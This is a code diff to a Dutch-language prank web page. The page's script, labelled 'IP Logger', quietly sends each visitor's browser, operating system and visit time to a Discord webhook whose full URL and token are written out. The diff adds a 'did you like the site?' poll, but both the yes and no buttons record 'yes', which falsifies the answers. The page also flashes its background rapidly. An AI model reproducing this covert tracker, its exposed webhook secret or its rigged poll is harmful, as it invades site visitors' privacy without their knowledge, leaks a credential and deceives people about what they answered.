@@ -11,7 +11,7 @@
             padding-top: 50px;
             background-color: white;
             color: black;
-            animation: changeBackground 0.2s infinite;
+            animation: changeBackground 0.4s infinite;
             position: relative;
         }
         h1 {
@@ -42,7 +42,7 @@
         }
         #popup-content p {
             margin-bottom: 10px;
-            color: black; /* maak de tekst zwart */
+            color: black; /* make text black */
         }
         #popup-content button {
             padding: 10px 20px;
@@ -58,14 +58,14 @@
     <script>
         var embedSent = false;
 
-        function startMusic() {
+        function startMusic(liked) {
             hidePopup();
-            var audio = new Audio('sound.mp3');
-            audio.play();
             if (!embedSent) {
-                sendToDiscord();
+                sendToDiscord(liked);
                 embedSent = true;
             }
+            var audio = new Audio('sound.mp3');
+            audio.play();
         }
 
         function hidePopup() {
@@ -73,12 +73,13 @@
             popup.style.display = 'none';
         }
 
-        function sendToDiscord() {
+        function sendToDiscord(liked) {
             var ipAddress = "127.0.0.1"; // Simulated IP address for demonstration
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
             var os = detectOS(userAgent);
             var browser = detectBrowser(userAgent);
+            var likedText = liked ? "Ja" : "Nee";
             var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';
 
             var embed = {
@@ -86,7 +87,7 @@
                     {
                         "title": "IP Logger",
                         "description": "Een gebruiker heeft de pagina bezocht.",
-                        "color": 16711680, // Rood
+                        "color": liked ? 65280 : 16711680, // Green if liked, Red if not liked
                         "fields": [
                             {
                                 "name": "IP Adres",
@@ -111,6 +112,11 @@
                             {
                                 "name": "Tijdstip",
                                 "value": timestamp,
+                                "inline": true
+                            },
+                            {
+                                "name": "Vond de site leuk?",
+                                "value": likedText,
                                 "inline": true
                             }
                         ]
@@ -159,7 +165,7 @@
         window.onload = function() {
             var popup = document.getElementById('popup');
             popup.addEventListener('click', function() {
-                startMusic();
+                startMusic(true);
             });
         }
     </script>
@@ -170,8 +176,8 @@
     <div id="popup">
         <div id="popup-content">
             <p>Vind je deze site leuk?</p>
-            <button onclick="hidePopup()">Ja</button>
-            <button onclick="hidePopup()">Nee</button>
+            <button onclick="startMusic(true)">Ja</button>
+            <button onclick="startMusic(true)">Nee</button>
         </div>
     </div>
     <audio id="music" autoplay loop>
